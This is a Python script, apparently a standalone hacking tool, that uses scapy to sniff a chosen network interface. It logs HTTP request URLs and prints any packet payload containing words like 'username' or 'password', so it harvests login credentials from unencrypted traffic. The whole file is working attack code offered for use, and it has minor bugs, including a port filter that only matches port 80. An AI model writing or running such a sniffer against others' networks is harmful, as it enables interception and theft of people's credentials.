from scapy.all import sniff, Raw
from scapy.layers.http import HTTPRequest
from scapy.layers.l2 import Ether
from argparse import ArgumentParser, ArgumentError
from typing import NamedTuple, Union, Optional

class Options(NamedTuple):
    '''
    Tuple for storing configuration constants.
    '''
    interface: str
    verbose: bool

def get_args() -> 'Options':
    '''
    Parses command arguments for initialization of config options.
    '''
    parser = ArgumentParser()
    try:
        parser.add_argument('-i', '--interface', dest='interface', help='The interface device to snif packets from')
        parser.add_argument('-v', '--verbose', action='store_true', help='Enable verbose logging for debugging purposes.')
        options = parser.parse_args()
        if not options.interface:
            error('Invalid arguments. You must specify a valid network interface. See help for more info.')
        if not options.verbose:
            options.verbose = False
        return Options(options.interface, options.verbose)
    except ArgumentError as e:
        error('An error occurred while parsing input arguments.')
        return

def sniff_packets(interface: str) -> None:
    '''
    Sniffs packets sent through a given network interface. 
    '''
    sniff(iface=interface, store=False, prn=proc_packet, filter='port 80' or 'port 443')

def get_url(packet: Ether) -> str:
    '''
    Returns the url of a given packet.
    '''
    return packet[HTTPRequest].Host + packet[HTTPRequest].Path

def __has_login_credentials(packet: Ether) -> str:
    '''
    Returns the load of a packet that is determined to likely contain login credentials. 
    Returns None if no login credentials are found.
    '''
    if packet.haslayer(Raw):
        load = str(packet[Raw].load)
        keywords = ['username', 'user', 'login', 'password', 'pass']
        for keyword in keywords:
            if keyword in load: return True
    return False

def proc_packet(packet: Ether) -> None:
    '''
    Consumes a a given packet. Outputs to standard output if the packet is an HTTP request that 
    contains potential login credentials.
    '''
    if packet.haslayer(HTTPRequest):
        url = get_url(packet)
        print(f'[+] HTTP Request >> {url}')
        if __has_login_credentials(packet):
            login_info = str(packet[Raw].load)
            print(f'\n\n[+] Possible login found > {login_info}\n\n')

def error(msg: str) -> None:
    '''
    Prints an error message to standard output before exiting.
    '''
    print(f'[-] {msg} Exiting...')
    exit()

def main(*args, **kwargs) -> None:
    config = get_args()
    print(f'[+] Waiting for packets on {config.interface}...')
    try:
        sniff_packets(config.interface)
    except (KeyboardInterrupt, InterruptedError):
        print('\n[+] Detected interrupt. Exiting...')

if __name__ == "__main__": main()